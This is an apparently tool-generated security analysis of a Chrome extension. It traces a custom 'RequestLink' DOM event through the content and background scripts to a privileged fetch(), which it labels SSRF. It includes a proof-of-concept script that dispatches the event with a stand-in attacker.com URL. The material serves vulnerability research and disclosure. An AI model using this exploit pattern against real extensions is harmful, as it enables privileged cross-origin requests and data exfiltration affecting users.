# CoCo Analysis: babmpdofgifmllocbffoimbchidahcmc

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: document_eventListener_RequestLink → fetch_resource_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/babmpdofgifmllocbffoimbchidahcmc/opgen_generated_files/cs_0.js
Line 475: document.addEventListener('RequestLink', function (evt) {
Line 476: if (evt.detail != null) {
Line 487: url = requestLinkTemp.url;

**Code:**

```javascript
// Content script (cs_0.js) - Lines 474-489
var requestLinkTemp = null;
document.addEventListener('RequestLink', function (evt) { // ← Entry point
    if (evt.detail != null) {
        requestLinkTemp = evt.detail; // ← attacker-controlled
        RequestLinkFun()
    }
});

function RequestLinkFun() {
    try {
        var url = "";
        var captcha = false;
        tempmobile = requestLinkTemp.mobile;
        url = requestLinkTemp.url; // ← attacker-controlled URL
        captcha = requestLinkTemp.captcha;
        chrome.runtime.sendMessage({
            type: "RequestLink",
            obj: url, // ← Pass attacker URL to background
            captcha: captcha,
            mid: requestLinkTemp.mid,
            incognito: chrome.extension.inIncognitoContext,
            mobile: tempmobile
        }, function (response) {
            // Response handling...
        });
    } catch (err) {
        // Error handling
    }
}

// Background script (bg.js) - Lines 1019-1048
chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
    if (request.type == "RequestLink") {
        var linkUrl = request.obj; // ← Receive attacker-controlled URL
        var mobile = request.mobile;
        if (linkUrl.localeCompare(spinUrlRequest) == 0) {
            sendResponse({response: spinUrlRequestData});
            // Handle cached response...
        } else {
            spinUrlRequest = linkUrl;
            try {
                if (mobile) {
                    checkIsMobile = mobile;
                } else {
                    checkIsMobile = null;
                }
                loadLinkUrl(linkUrl, request); // ← Pass to fetch function
            } catch (ex) {
                spinUrlRequestData = "-3";
            }
        }
    }
});

// Lines 1050-1093
function loadLinkUrl(linkUrl, request) {
    loadUrl(linkUrl, function (data, resp) { // ← Call fetch wrapper
        var isCaptcha = resp.url.startsWith('https://www.google.com/sorry/index');
        if (isCaptcha) {
            spinUrlRequestData = "-1";
            // Handle captcha...
        } else {
            spinUrlRequestData = data;
        }
    }, function (error) {
        spinUrlRequestData = "-2";
    })
}

// Lines 991-995
function loadUrl(url, func, error) {
    fetch(url).then(function (resp) { // ← SSRF sink - fetch to attacker URL
        resp.text().then(function (text) { func(text, resp); })
    }).catch(error);
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM Custom Event (document.addEventListener)

**Attack:**

```javascript
// Malicious webpage dispatches custom event
// Content script runs on *://*/* (all URLs) per manifest.json line 17
var event = new CustomEvent('RequestLink', {
    detail: {
        url: 'https://attacker.com/collect',
        mobile: false,
        captcha: false,
        mid: '123'
    }
});
document.dispatchEvent(event);

// Extension will:
// 1. Receive the event in content script
// 2. Extract attacker's URL from evt.detail
// 3. Send message to background script
// 4. Background makes privileged fetch() to attacker.com/collect
// 5. Response data sent back to content script via sendResponse
```

**Impact:** Server-Side Request Forgery (SSRF) vulnerability exploitable from any webpage. An attacker can force the extension to make privileged cross-origin HTTP requests to arbitrary URLs. The extension operates with elevated privileges (host_permissions for blogsansale.vn and google.com), can access internal networks, bypass CORS restrictions, and potentially exfiltrate data. The fetched response is returned to the attacker-controlled webpage via the sendResponse callback, allowing the attacker to read responses from internal services or protected resources that the extension can access.
